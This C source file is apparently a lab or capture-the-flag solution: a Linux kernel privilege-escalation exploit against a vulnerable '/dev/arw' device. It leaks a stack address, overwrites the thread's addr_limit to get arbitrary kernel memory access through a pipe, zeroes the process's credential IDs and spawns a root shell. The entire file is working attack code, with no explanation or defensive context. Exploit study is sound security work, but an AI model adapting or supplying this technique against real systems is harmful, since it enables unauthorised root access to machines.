#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <sys/ioctl.h>

#define READ_HANDLER 0
#define WRITE_HANDLER 1

// p &((struct thread_info*)0)->addr_limit
#define ADDR_LIMIT_OFFSET 0x18
// p &((struct task_struct*)0)->real_cred
#define REAL_CRED_OFFSET 0x5f8
// p &((struct cred*)0)->uid
#define UID_OFFSET 0x4
// p &((struct cred*)0)->securebits
#define CRED_LEN 0x20

#define PTR_LEN sizeof(void *)

// calculate thread_info
#define THREAD_SIZE 0x4000
#define CURRENT_MASK (~(THREAD_SIZE - 1))

struct ioctl_param
{
    size_t  len;
    char    buf;
    void*   addr;
};

int pipefd[2];

int kmemcpy(void *dest, void *src, size_t size)
{
    // write to pipe
    while(write(pipefd[1], src, size) == -1);
    // read from pipe
    read(pipefd[0], dest, size);
    return size;
}

int main(void)
{
    int     fd;
    int     result;
    struct  ioctl_param param;
    
    void* thread_info;
    void* addr_limit;
    void* task_addr;
    void* cred;
    void* real_cred;
    void* cred_ids;

    fd = open("/dev/arw", O_RDWR);
    if (fd == -1) {
        printf("open arw device failed!\n");
        return -1;
    }

    result = pipe(pipefd);
    if (result < 0) {
        printf("[*] pipe failed: %d\n", result);
        exit(1);
    }

    // leak stack addr
    ioctl(fd, READ_HANDLER, &param);
    printf("[*] stack's address: %p\n", param.addr);

    thread_info = (void *)((long) param.addr & CURRENT_MASK);
    printf("[*] thread_info's address: %p\n", thread_info);
    addr_limit = thread_info + ADDR_LIMIT_OFFSET;
    printf("[*] addr_limit's  address: %p\n", addr_limit);

    // set addr limit to 0xffffffffffffffff
    param.len  = PTR_LEN;
    param.buf  = (char) 0xff;
    param.addr = addr_limit;
    ioctl(fd, WRITE_HANDLER, &param);

    // get task_struct
    kmemcpy(&task_addr, thread_info, PTR_LEN);
    printf("[*] task_struct's address: %p\n", task_addr);

    kmemcpy(&real_cred, task_addr + REAL_CRED_OFFSET, PTR_LEN);
    printf("[*] task_struct->real_cred's address: %p\n", real_cred);

    cred = real_cred + sizeof(void *);
    printf("[*] task_struct->cred's address: %p\n", cred);

    printf("[*] getuid() = %d, getgid() = %d\n", getuid(), getgid());
    printf("[*] modify credentials to zeros...\n");

    cred_ids = malloc(CRED_LEN);
    memset(cred_ids, 0, CRED_LEN);
    // modify task->cred
    kmemcpy(cred + UID_OFFSET, cred_ids, CRED_LEN);
    // modify task->real_cred
    kmemcpy(real_cred + UID_OFFSET, cred_ids, CRED_LEN);
    printf("[*] getuid() = %d, getgid() = %d\n", getuid(), getgid());

    free(cred_ids);
    cred_ids = NULL;

    close(pipefd[0]);
    close(pipefd[1]);

    system("/bin/sh");
    return 0;
}
